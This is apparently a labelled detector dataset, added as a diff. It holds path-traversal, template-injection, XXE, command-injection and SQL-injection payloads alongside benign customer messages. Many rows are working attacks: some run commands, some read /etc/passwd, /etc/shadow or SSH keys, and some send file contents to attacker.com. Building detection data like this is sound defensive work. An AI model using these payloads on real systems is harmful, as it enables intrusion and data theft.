+../../../var/mail/root,PATH_TRAVERSAL
+..\..\..\inetpub\wwwroot\web.config,PATH_TRAVERSAL
+../../../../etc/mysql/my.cnf,PATH_TRAVERSAL
+../../../var/lib/php/sessions/,PATH_TRAVERSAL
+..\..\..\windows\system32\license.rtf,PATH_TRAVERSAL
+../../../../etc/apache2/apache2.conf,PATH_TRAVERSAL
+../../../var/log/nginx/error.log,PATH_TRAVERSAL
+..\..\..\windows\system32\inetsrv\config\applicationHost.config,PATH_TRAVERSAL
+../../../../etc/profile,PATH_TRAVERSAL
+../../../home/user/.ssh/authorized_keys,PATH_TRAVERSAL
+..\..\..\windows\panther\unattend.xml,PATH_TRAVERSAL
+../../../../etc/crontab,PATH_TRAVERSAL
+../../../proc/self/cmdline,PATH_TRAVERSAL
+..\..\..\windows\debug\netsetup.log,PATH_TRAVERSAL
+../../../../etc/resolv.conf,PATH_TRAVERSAL
+../../../var/www/.htpasswd,PATH_TRAVERSAL
+..\..\..\windows\repair\sam,PATH_TRAVERSAL
+../../../../etc/fstab,PATH_TRAVERSAL
+ssti0: {{7*7}},SSTI
+ssti1: ${7*7},SSTI
+ssti2: {{config.items()}},SSTI
+{{self.__init__.__globals__.__builtins__.__import__('os').popen('id').read()}},SSTI
+{{''.__class__.__mro__[1].__subclasses__()}},SSTI
+{{request.application.__globals__.__builtins__.__import__('os').popen('cat /etc/passwd').read()}},SSTI
+"{%for c in [].__class__.__base__.__subclasses__()%}{%if c.__name__=='catch_warnings'%}{{c.__init__.__globals__['__builtins__'].open('/etc/passwd','r').read()}}{%endif%}{%endfor%}",SSTI
+ssti7: {{config.__class__.__init__.__globals__['os'].popen('ls').read()}},SSTI
+{{''.__class__.__base__.__subclasses__()[104].__init__.__globals__['sys'].modules['os'].popen('id').read()}},SSTI
+${T(java.lang.Runtime).getRuntime().exec('cat /etc/passwd')},SSTI
+ssti10: *{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('id').getInputStream())},SSTI
+{{lipsum.__globals__['os'].popen('id').read()}},SSTI
+ssti12: {{cycler.__init__.__globals__.os.popen('id').read()}},SSTI
+ssti13: {{joiner.__init__.__globals__.os.popen('id').read()}},SSTI
+ssti14: {{namespace.__init__.__globals__.os.popen('id').read()}},SSTI
+{% import os %}{{os.popen('id').read()}},SSTI
+{{request.__class__._load_form_data.__globals__['__builtins__'].open('/etc/passwd').read()}},SSTI
+"${{<%[%'\""}}%\",SSTI
+{{[].__class__.__base__.__subclasses__()[104].__init__.__globals__['sys'].modules['os'].popen('whoami').read()}},SSTI
+{php}echo `id`;{/php},SSTI
+{php}system('cat /etc/passwd');{/php},SSTI
+ssti21: {{7*'7'}},SSTI
+{{self}},SSTI
+ssti23: {{request}},SSTI
+{{settings}},SSTI
+{{app}},SSTI
+{{get_flashed_messages}},SSTI
+{{url_for.__globals__['current_app'].config}},SSTI
+{{request.__class__.__mro__[8].__subclasses__()[40]('/etc/passwd').read()}},SSTI
+"{{[].__class__.__mro__[1].__subclasses__()[396]('cat /etc/passwd',shell=True,stdout=-1).communicate()}}",SSTI
+${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('/etc/passwd').toURL().openStream()},SSTI
+"#{session.getAttribute('loader').getClass().forName('java.lang.Runtime').getMethod('getRuntime',null).invoke(null,null).exec('cat /etc/passwd')}",SSTI
+<#assign ex='freemarker.template.utility.Execute'?new()>${ex('id')},SSTI
+${''.getClass().forName('java.lang.Runtime').getRuntime().exec('id')},SSTI
+{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}},SSTI
+{{''|attr('\x5f\x5fclass\x5f\x5f')|attr('\x5f\x5fbase\x5f\x5f')|attr('\x5f\x5fsubclasses\x5f\x5f')()|attr('\x5f\x5fgetitem\x5f\x5f')(104)|attr('\x5f\x5finit\x5f\x5f')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('sys')|attr('modules')|attr('\x5f\x5fgetitem\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}},SSTI
+"{% for x in ().__class__.__base__.__subclasses__() %}{% if ""warning"" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen('id').read()}}{%endif%}{% endfor %}",SSTI
+"{{''.class.mro()[1].subclasses()[396]('cat /etc/passwd',shell=True,stdout=-1).communicate()}}",SSTI
+ssti38: {{self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read()}},SSTI
+ssti39: {{self._TemplateReference__context.joiner.__init__.__globals__.os.popen('id').read()}},SSTI
+ssti40: {{self._TemplateReference__context.namespace.__init__.__globals__.os.popen('id').read()}},SSTI
+${@java.lang.Runtime@getRuntime().exec('cat /etc/passwd')},SSTI
+#{T(java.lang.Runtime).getRuntime().exec('cat /etc/passwd')},SSTI
+"%{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='id').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}",SSTI
+"{{x.__init__.__globals__.__builtins__.eval('__import__(""os"").popen(""id"").read()')}}",SSTI
+"{{x.__init__.__globals__.eval('__import__(""os"").popen(""id"").read()')}}",SSTI
+"{{x.__init__.__globals__['eval']('__import__(""os"").popen(""id"").read()')}}",SSTI
+${{7*7}}[${{%(5+5)}}],SSTI
+"${class.getClassLoader().loadClass('java.lang.Runtime').getMethod('getRuntime',null).invoke(null,null).exec('id')}",SSTI
+<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><foo>&xxe;</foo>,XXE
+<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///c:/windows/system32/drivers/etc/hosts'>]><foo>&xxe;</foo>,XXE
+<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM 'http://attacker.com/evil.dtd'>%xxe;]>,XXE
+<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'php://filter/convert.base64-encode/resource=/etc/passwd'>]><foo>&xxe;</foo>,XXE
+<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'expect://id'>]><foo>&xxe;</foo>,XXE
+<!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM 'file:///etc/shadow'>]><foo>&xxe;</foo>,XXE
+<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'http://169.254.169.254/latest/meta-data/'>]><foo>&xxe;</foo>,XXE
+<!DOCTYPE foo [<!ENTITY % file SYSTEM 'file:///etc/passwd'><!ENTITY % dtd SYSTEM 'http://attacker.com/evil.dtd'>%dtd;]>,XXE
+"<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'data://text/plain;base64,SGVsbG8gV29ybGQ='>]><foo>&xxe;</foo>",XXE
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM 'jar:file:///var/myarchive.zip!/file.txt'>]><foo>&xxe;</foo>,XXE
+"<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM 'file:///etc/passwd'><!ENTITY % eval '<!ENTITY &#x25; exfil SYSTEM ""http://attacker.com/?x=%xxe;"">'>%eval;%exfil;]>",XXE
+<!DOCTYPE foo [<!ENTITY % file SYSTEM 'php://filter/read=convert.base64-encode/resource=/etc/passwd'><!ENTITY % dtd SYSTEM 'http://attacker.com/evil.dtd'>%dtd;]>,XXE
+<?xml version='1.0'?><!DOCTYPE foo SYSTEM 'http://attacker.com/evil.dtd'><foo>test</foo>,XXE
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///proc/self/environ'>]><foo>&xxe;</foo>,XXE
+<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'gopher://127.0.0.1:25/_MAIL'>]><foo>&xxe;</foo>,XXE
+<!DOCTYPE foo [<!ENTITY % xxe SYSTEM 'http://metadata.google.internal/computeMetadata/v1/instance/attributes/kube-env'>%xxe;]>,XXE
+<!-- XXE 16 --> <?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///var/log/apache2/access.log'>]><foo>&xxe;</foo>,XXE
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///var/www/html/config.php'>]><foo>&xxe;</foo>,XXE
+<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///home/user/.ssh/id_rsa'>]><foo>&xxe;</foo>,XXE
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM 'netdoc:///etc/passwd'>]><foo>&xxe;</foo>,XXE
+<!-- XXE 20 --> <?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/hostname'>]><foo>&xxe;</foo>,XXE
+<!DOCTYPE foo [<!ENTITY % local SYSTEM 'file:///etc/passwd'><!ENTITY % remote SYSTEM 'http://attacker.com/?%local;'>%remote;]>,XXE
+<!-- XXE 22 --> <?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///proc/version'>]><foo>&xxe;</foo>,XXE
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/issue'>]><foo>&xxe;</foo>,XXE
+<!-- XXE 24 --> <?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/group'>]><foo>&xxe;</foo>,XXE
+"<!DOCTYPE foo [<!ENTITY % param1 '<!ENTITY external SYSTEM ""http://attacker.com/?%payload;"">'>%param1;]>",XXE
+<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///var/log/auth.log'>]><foo>&xxe;</foo>,XXE
+<!-- XXE 27 --> <!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///c:/boot.ini'>]><foo>&xxe;</foo>,XXE
+<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///c:/windows/win.ini'>]><foo>&xxe;</foo>,XXE
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/mysql/my.cnf'>]><foo>&xxe;</foo>,XXE
+<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/apache2/apache2.conf'>]><foo>&xxe;</foo>,XXE
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///proc/self/cmdline'>]><foo>&xxe;</foo>,XXE
+<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///proc/self/status'>]><foo>&xxe;</foo>,XXE
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/crontab'>]><foo>&xxe;</foo>,XXE
+<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///var/spool/cron/crontabs/root'>]><foo>&xxe;</foo>,XXE
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/ssh/sshd_config'>]><foo>&xxe;</foo>,XXE
+<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///root/.bash_history'>]><foo>&xxe;</foo>,XXE
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///home/user/.bash_history'>]><foo>&xxe;</foo>,XXE
+<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/resolv.conf'>]><foo>&xxe;</foo>,XXE
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/hosts'>]><foo>&xxe;</foo>,XXE
+<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/networks'>]><foo>&xxe;</foo>,XXE
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///proc/net/arp'>]><foo>&xxe;</foo>,XXE
+<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///proc/net/tcp'>]><foo>&xxe;</foo>,XXE
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///proc/net/udp'>]><foo>&xxe;</foo>,XXE
+<!-- XXE 44 --> <?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///sys/class/net/eth0/address'>]><foo>&xxe;</foo>,XXE
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///var/lib/mlocate/mlocate.db'>]><foo>&xxe;</foo>,XXE
+<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/fstab'>]><foo>&xxe;</foo>,XXE
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/mtab'>]><foo>&xxe;</foo>,XXE
+<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///proc/mounts'>]><foo>&xxe;</foo>,XXE
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///c:/windows/system32/config/sam'>]><foo>&xxe;</foo>,XXE
+"Hello, how are you today?",Benign
+Please update my profile information,Benign
+What is the weather like?,Benign
+I would like to order a pizza,Benign
+Can you help me with my account?,Benign
+Thank you for your assistance,Benign
+Please send me the invoice,Benign
+I need to reset my password,Benign
+What are your business hours?,Benign
+Where is the nearest store?,Benign
+How do I contact customer support?,Benign
+I am interested in your products,Benign
+Can I schedule an appointment?,Benign
+Please provide more information,Benign
+I would like to subscribe to your newsletter,Benign
+What payment methods do you accept?,Benign
+How long does shipping take?,Benign
+Is there a return policy?,Benign
+Can I track my order?,Benign
+I need help with installation,Benign
+What are the system requirements?,Benign
+Do you offer technical support?,Benign
+I would like to report a bug,Benign
+Can you recommend a solution?,Benign
+What are the latest features?,Benign
+How do I upgrade my plan?,Benign
+Is there a discount available?,Benign
+Can I cancel my subscription?,Benign
+Please confirm my booking,Benign
+I need to update my billing address,Benign
+What is your privacy policy?,Benign
+How do I delete my account?,Benign
+Can I export my data?,Benign
+What are the terms of service?,Benign
+I would like to provide feedback,Benign
+How do I change my email address?,Benign
+Can you resend the confirmation email?,Benign
+What languages do you support?,Benign
+Is there a mobile app available?,Benign
+How do I enable two-factor authentication?,Benign
+Can I integrate with other services?,Benign
+What are the API rate limits?,Benign
+How do I generate an API key?,Benign
+Is there documentation available?,Benign
+Can I access historical data?,Benign
+What are the storage limits?,Benign
+How do I share files with others?,Benign
+Can I create multiple accounts?,Benign
+What are the security features?,Benign
+How do I report a security issue?,Benign
+; cat /etc/hosts | grep localhost,COMMAND_INJECTION
+"| find / -name ""config.php"" 2>/dev/null",COMMAND_INJECTION
+&& chmod 777 /var/www/html,COMMAND_INJECTION
+|| ps -ef | grep apache,COMMAND_INJECTION
+"`grep -r ""admin"" /var/log/`",COMMAND_INJECTION
+$(dpkg -l | grep openssh),COMMAND_INJECTION
+; tail -f /var/log/syslog,COMMAND_INJECTION
+| head -n 100 /var/log/messages,COMMAND_INJECTION
+&& service apache2 status,COMMAND_INJECTION
+; systemctl list-units --type=service,COMMAND_INJECTION
+| rpm -qa | grep kernel,COMMAND_INJECTION
+&& apt list --installed,COMMAND_INJECTION
+; yum list installed,COMMAND_INJECTION
+| pip freeze | grep django,COMMAND_INJECTION
+&& npm list -g --depth=0,COMMAND_INJECTION
+; gem list --local,COMMAND_INJECTION
+| composer show --installed,COMMAND_INJECTION
+&& docker ps -a,COMMAND_INJECTION
+; kubectl get pods,COMMAND_INJECTION
+| aws s3 ls,COMMAND_INJECTION
+&& git log --oneline -10,COMMAND_INJECTION
+; svn status,COMMAND_INJECTION
+| hg log -l 5,COMMAND_INJECTION
+&& mysql -e 'SHOW DATABASES;',COMMAND_INJECTION
+; psql -c '\l',COMMAND_INJECTION
+| redis-cli KEYS '*',COMMAND_INJECTION
+&& mongo --eval 'db.getMongo().getDBNames()',COMMAND_INJECTION
+; curl -s http://localhost:8080/health,COMMAND_INJECTION
+| wget -q -O- http://127.0.0.1/status,COMMAND_INJECTION
+&& nmap -sV localhost,COMMAND_INJECTION
+; traceroute google.com,COMMAND_INJECTION
+| dig google.com ANY,COMMAND_INJECTION
+&& nslookup google.com,COMMAND_INJECTION
+; host -a google.com,COMMAND_INJECTION
+| tcpdump -i eth0 -n,COMMAND_INJECTION
+&& arp -a,COMMAND_INJECTION
+; route -n,COMMAND_INJECTION
+| ip route show,COMMAND_INJECTION
+&& netcat -zv localhost 1-1000,COMMAND_INJECTION
+; socat - TCP:localhost:22,COMMAND_INJECTION
+<?xml version='1.0'?><!DOCTYPE data [<!ENTITY file SYSTEM 'file:///var/www/html/.htaccess'>]><data>&file;</data>,XXE
+<!DOCTYPE config [<!ENTITY xxe SYSTEM 'file:///usr/local/apache2/conf/httpd.conf'>]><config>&xxe;</config>,XXE
+<?xml version='1.0'?><!DOCTYPE root [<!ENTITY test SYSTEM 'file:///var/log/nginx/error.log'>]><root>&test;</root>,XXE
+<!DOCTYPE user [<!ENTITY info SYSTEM 'file:///home/user/.bashrc'>]><user>&info;</user>,XXE
+<?xml version='1.0'?><!DOCTYPE app [<!ENTITY data SYSTEM 'file:///opt/app/config.json'>]><app>&data;</app>,XXE
+<!DOCTYPE system [<!ENTITY cmd SYSTEM 'file:///usr/bin/whoami'>]><system>&cmd;</system>,XXE
+<?xml version='1.0'?><!DOCTYPE doc [<!ENTITY ext SYSTEM 'file:///tmp/test.txt'>]><doc>&ext;</doc>,XXE
+<!DOCTYPE meta [<!ENTITY xxe SYSTEM 'file:///etc/os-release'>]><meta>&xxe;</meta>,XXE
+<?xml version='1.0'?><!DOCTYPE root [<!ENTITY xxe SYSTEM 'file:///proc/cpuinfo'>]><root>&xxe;</root>,XXE
+<!DOCTYPE data [<!ENTITY file SYSTEM 'file:///proc/meminfo'>]><data>&file;</data>,XXE
+<?xml version='1.0'?><!DOCTYPE system [<!ENTITY xxe SYSTEM 'file:///sys/class/dmi/id/product_name'>]><system>&xxe;</system>,XXE
+<!DOCTYPE config [<!ENTITY data SYSTEM 'file:///etc/timezone'>]><config>&data;</config>,XXE
+<?xml version='1.0'?><!DOCTYPE app [<!ENTITY xxe SYSTEM 'file:///etc/locale.conf'>]><app>&xxe;</app>,XXE
+<!DOCTYPE root [<!ENTITY file SYSTEM 'file:///var/log/messages'>]><root>&file;</root>,XXE
+<?xml version='1.0'?><!DOCTYPE user [<!ENTITY xxe SYSTEM 'file:///var/log/secure'>]><user>&xxe;</user>,XXE
+<!DOCTYPE data [<!ENTITY info SYSTEM 'file:///var/log/kern.log'>]><data>&info;</data>,XXE
+<?xml version='1.0'?><!DOCTYPE test [<!ENTITY xxe SYSTEM 'file:///var/log/dmesg'>]><test>&xxe;</test>,XXE
+<!DOCTYPE system [<!ENTITY file SYSTEM 'file:///proc/loadavg'>]><system>&file;</system>,XXE
+<?xml version='1.0'?><!DOCTYPE meta [<!ENTITY xxe SYSTEM 'file:///proc/uptime'>]><meta>&xxe;</meta>,XXE
+<!DOCTYPE config [<!ENTITY data SYSTEM 'file:///proc/filesystems'>]><config>&data;</config>,XXE
+<?xml version='1.0'?><!DOCTYPE root [<!ENTITY xxe SYSTEM 'file:///proc/partitions'>]><root>&xxe;</root>,XXE
+<!DOCTYPE app [<!ENTITY file SYSTEM 'file:///proc/swaps'>]><app>&file;</app>,XXE
+<?xml version='1.0'?><!DOCTYPE user [<!ENTITY xxe SYSTEM 'file:///etc/services'>]><user>&xxe;</user>,XXE
+<!DOCTYPE data [<!ENTITY info SYSTEM 'file:///etc/protocols'>]><data>&info;</data>,XXE
+<?xml version='1.0'?><!DOCTYPE test [<!ENTITY xxe SYSTEM 'file:///etc/rpc'>]><test>&xxe;</test>,XXE
+<!DOCTYPE system [<!ENTITY file SYSTEM 'file:///etc/nsswitch.conf'>]><system>&file;</system>,XXE
+<?xml version='1.0'?><!DOCTYPE meta [<!ENTITY xxe SYSTEM 'file:///etc/host.conf'>]><meta>&xxe;</meta>,XXE
+<!DOCTYPE config [<!ENTITY data SYSTEM 'file:///etc/shells'>]><config>&data;</config>,XXE
+<?xml version='1.0'?><!DOCTYPE root [<!ENTITY xxe SYSTEM 'file:///etc/profile'>]><root>&xxe;</root>,XXE
+<!DOCTYPE app [<!ENTITY file SYSTEM 'file:///etc/environment'>]><app>&file;</app>,XXE
+<?xml version='1.0'?><!DOCTYPE user [<!ENTITY xxe SYSTEM 'file:///etc/security/limits.conf'>]><user>&xxe;</user>,XXE
+<!DOCTYPE data [<!ENTITY info SYSTEM 'file:///etc/pam.d/common-auth'>]><data>&info;</data>,XXE
+<?xml version='1.0'?><!DOCTYPE test [<!ENTITY xxe SYSTEM 'file:///etc/sudoers'>]><test>&xxe;</test>,XXE
+<!DOCTYPE system [<!ENTITY file SYSTEM 'file:///var/spool/mail/root'>]><system>&file;</system>,XXE
+<?xml version='1.0'?><!DOCTYPE meta [<!ENTITY xxe SYSTEM 'file:///var/log/btmp'>]><meta>&xxe;</meta>,XXE
+<!DOCTYPE config [<!ENTITY data SYSTEM 'file:///var/log/wtmp'>]><config>&data;</config>,XXE
+<?xml version='1.0'?><!DOCTYPE root [<!ENTITY xxe SYSTEM 'file:///var/log/lastlog'>]><root>&xxe;</root>,XXE
+<!DOCTYPE app [<!ENTITY file SYSTEM 'file:///var/log/faillog'>]><app>&file;</app>,XXE
+<?xml version='1.0'?><!DOCTYPE user [<!ENTITY xxe SYSTEM 'file:///run/systemd/system'>]><user>&xxe;</user>,XXE
+<!DOCTYPE data [<!ENTITY info SYSTEM 'file:///lib/systemd/system/'>]><data>&info;</data>,XXE
+"{{range.constructor('return global.process.mainModule.require(""child_process"").execSync(""id"")')()}}",SSTI
+${@java.lang.System@getProperty('user.name')},SSTI
+{{request.application.__self__._get_data_for_json}},SSTI
+{%set x=request.application.__globals__.__builtins__%}{%print(x)%},SSTI
+{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/hostname').read()}},SSTI
+${T(java.lang.System).getProperty('java.version')},SSTI
+{{config.__class__.__init__.__globals__['os'].environ}},SSTI
+{%for item in request.application.__globals__%}{{item}}{%endfor%},SSTI
+"{{''.__class__.__mro__[1].__subclasses__()[396]('ls',shell=True,stdout=-1).communicate()}}",SSTI
+${T(java.lang.Runtime).getRuntime().availableProcessors()},SSTI
+{{url_for.__globals__['__builtins__'].__import__('os').environ}},SSTI
+{%print(request.environ)%},SSTI
+{{get_flashed_messages.__globals__['current_app'].config.items()}},SSTI
+${@java.lang.System@getProperty('os.name')},SSTI
+{{session.__class__.__mro__[1].__subclasses__()}},SSTI
+{%for c in [].__class__.__base__.__subclasses__()%}{{c.__name__}}{%endfor%},SSTI
+{{request.args.__class__.__mro__[1]}},SSTI
+{{lipsum.__globals__.os.environ}},SSTI
+{%print(config.items())%},SSTI
+{{cycler.__init__.__globals__['__builtins__'].dir()}},SSTI
+${@java.lang.System@getProperty('java.home')},SSTI
+{{joiner.__init__.__globals__.keys()}},SSTI
+{%for key in request.application.__globals__.keys()%}{{key}}{%endfor%},SSTI
+{{namespace.__init__.__globals__['sys'].version}},SSTI
+${T(java.lang.System).getProperty('file.separator')},SSTI
+{{request.environ.items()}},SSTI
+{%print(request.cookies)%},SSTI
+{{g.__class__.__mro__}},SSTI
+${@java.lang.System@getProperty('path.separator')},SSTI
+{{dict.__class__.__mro__[1]}},SSTI
+{%for attr in request.application.__globals__.__builtins__%}{{attr}}{%endfor%},SSTI
+{{request.headers.items()}},SSTI
+${T(java.lang.System).getProperty('line.separator')},SSTI
+{{().__class__.__base__.__subclasses__()[104].__init__.__globals__.keys()}},SSTI
+{%print(session.keys())%},SSTI
+{{url_for.__globals__.os.name}},SSTI
+${@java.lang.System@getProperty('java.class.path')},SSTI
+{{request.values.items()}},SSTI
+{%for module in request.application.__globals__.__builtins__.__dict__%}{{module}}{%endfor%},SSTI
+"' AND ASCII(SUBSTRING(database(),1,1))>96--",SQLi
+1' OR EXISTS(SELECT 1 FROM information_schema.tables WHERE table_schema=database())--,SQLi
+admin' AND LENGTH(database())>5--,SQLi
+"' UNION SELECT table_schema,table_name FROM information_schema.tables--",SQLi
+1' AND (SELECT COUNT(*) FROM information_schema.columns WHERE table_name='users')>0--,SQLi
+' OR '1'='1' AND SLEEP(2)--,SQLi
+"admin' OR BENCHMARK(1000000,MD5('test'))--",SQLi
+"1' AND MID((SELECT database()),1,1)>'a'--",SQLi
+"' UNION SELECT user,host FROM mysql.user--",SQLi
+"admin' OR ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>64--",SQLi
+1' AND (SELECT user FROM mysql.user WHERE user='root' LIMIT 1)='root'--,SQLi
+"' OR updatexml(null,concat(0x7e,(SELECT user())),null)--",SQLi
+"admin' AND extractvalue(null,concat(0x7e,(SELECT database())))--",SQLi
+1' OR exp(~(SELECT * FROM (SELECT user())x))--,SQLi
+"' UNION SELECT NULL,CONCAT(username,0x3a,password) FROM users--",SQLi
+"admin' AND polygoncontains((SELECT * FROM (SELECT user())x),1)--",SQLi
+"1' OR gtid_subset(version(),1)--",SQLi
+' AND (SELECT COUNT(*) FROM mysql.user)>0--,SQLi
+admin' OR JSON_KEYS((SELECT user()))--,SQLi
+"1' UNION SELECT NULL,GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name='users'--",SQLi
+' OR uuid_short()--,SQLi
+admin' AND (SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 1)='users'--,SQLi
+"1' OR (SELECT * FROM (SELECT COUNT(*),CONCAT((SELECT user()),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)y)--",SQLi
+"' UNION SELECT NULL,LOAD_FILE('/var/www/html/config.php')--",SQLi
+admin' OR (SELECT COUNT(*) FROM sysobjects WHERE xtype='U' AND name='users')>0--,SQLi
+1'; DECLARE @x VARCHAR(8000);SET @x=0x5345;EXEC(@x)--,SQLi
+"' OR ASCII(SUBSTRING((SELECT TOP 1 name FROM sysobjects WHERE xtype='U'),1,1))>64--",SQLi
+"admin' UNION SELECT NULL,NULL,NULL FROM DUAL--",SQLi
+1' AND (SELECT banner FROM v$version WHERE rownum=1) LIKE 'Oracle%'--,SQLi
+"' OR DBMS_PIPE.RECEIVE_MESSAGE('test',5)--",SQLi
+"admin' UNION SELECT NULL,UTL_INADDR.GET_HOST_ADDRESS('127.0.0.1') FROM DUAL--",SQLi
+1' AND (SELECT user FROM all_users WHERE rownum=1)='SYS'--,SQLi
+"' OR CTXSYS.DRITHSX.SN(user,(SELECT banner FROM v$version WHERE rownum=1))--",SQLi
+admin' AND (SELECT COUNT(*) FROM all_tables WHERE owner='SYS')>0--,SQLi
+1'; SELECT pg_sleep(5)--,SQLi
+' OR 1=1; SELECT version()--,SQLi
+"admin' UNION SELECT NULL,current_database(),current_user--",SQLi
+1' AND (SELECT COUNT(*) FROM pg_tables WHERE schemaname='public')>0--,SQLi
+"' OR ASCII(SUBSTRING(current_database(),1,1))>96--",SQLi
+"admin' UNION SELECT NULL,NULL,string_agg(table_name,',') FROM information_schema.tables--",SQLi
+1' AND (SELECT usename FROM pg_user WHERE usename='postgres' LIMIT 1)='postgres'--,SQLi
+"' OR pg_read_file('/etc/passwd',0,200)--",SQLi
+"admin' UNION SELECT NULL,query FROM pg_stat_activity--",SQLi
+1'; COPY (SELECT user) TO '/tmp/output.txt'--,SQLi
+' OR lo_import('/etc/passwd')--,SQLi
+admin' AND (SELECT COUNT(*) FROM sqlite_master WHERE type='table')>0--,SQLi
+"1' UNION SELECT NULL,sql FROM sqlite_master WHERE type='table'--",SQLi
+' OR load_extension('/tmp/evil.so')--,SQLi
+"admin' UNION SELECT NULL,group_concat(name) FROM sqlite_master WHERE type='table'--",SQLi
+1' AND (SELECT COUNT(*) FROM pragma_table_info('users'))>0--,SQLi
+../../../var/cache/apt/archives/,PATH_TRAVERSAL
+..\..\..\windows\temp\,PATH_TRAVERSAL
+....//....//var/lib/dpkg/status,PATH_TRAVERSAL
+..%2F..%2F..%2Fvar%2Flog%2Fsyslog,PATH_TRAVERSAL
+..%5c..%5c..%5cwindows%5ctemp%5c,PATH_TRAVERSAL
+%2e%2e%2f%2e%2e%2fvar%2fwww%2f,PATH_TRAVERSAL
+..%252f..%252fopt%252f,PATH_TRAVERSAL
+..%c0%afvar%c0%aflog%c0%af,PATH_TRAVERSAL
+..%c1%9cwindows%c1%9ctemp%c1%9c,PATH_TRAVERSAL
+/usr/local/../../../etc/passwd,PATH_TRAVERSAL
+file:///var/log/nginx/access.log,PATH_TRAVERSAL
+file:///c:/inetpub/logs/,PATH_TRAVERSAL
+../../../../../../var/lib/mysql/,PATH_TRAVERSAL
+../../../opt/tomcat/logs/catalina.out,PATH_TRAVERSAL
+..\..\..\Program Files\,PATH_TRAVERSAL
+....//....//usr/share/nginx/html/,PATH_TRAVERSAL
+%2e%2e/%2e%2e/var/spool/cron/,PATH_TRAVERSAL
+..;/..;/var/backups/,PATH_TRAVERSAL
+..//..//usr/local/etc/,PATH_TRAVERSAL
